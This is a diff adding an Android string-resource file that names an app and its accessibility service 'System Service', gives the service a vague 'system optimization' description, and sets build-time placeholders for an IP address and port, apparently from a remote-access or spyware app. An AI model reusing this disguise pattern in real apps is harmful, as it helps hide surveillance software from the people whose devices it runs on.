@@ -1,0 +1,7 @@
+<resources>
+    <string name="app_name">System Service</string>
+    <string name="accessibility_service_label">System Service</string>
+    <string name="accessibility_service_description">This service provides enhanced accessibility features for system optimization.</string>
+    <string name="MY_IP">@MY_IP@</string>
+    <string name="MY_PORT">@MY_PORT@</string>
+</resources>
